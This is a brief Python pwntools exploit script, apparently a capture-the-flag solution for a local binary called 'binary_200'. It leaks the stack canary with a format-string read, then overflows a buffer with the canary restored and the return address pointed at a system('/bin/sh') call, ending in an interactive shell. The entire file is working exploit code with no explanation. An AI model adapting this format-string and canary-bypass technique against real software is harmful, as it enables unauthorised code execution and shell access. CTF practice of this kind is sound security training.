#!/usr/bin/python env

from pwn import *

sh = process('./binary_200')

system_addr = 0x08048553#system('/bin/sh')
leak_canary = '%15$x'
sh.sendline(leak_canary)
canary_cookie = int(sh.recv(),16)
#print hex(canary)

sh.sendline('a'*40 + p32(canary_cookie) + 'b'*12 +p32(system_addr))

sh.interactive()
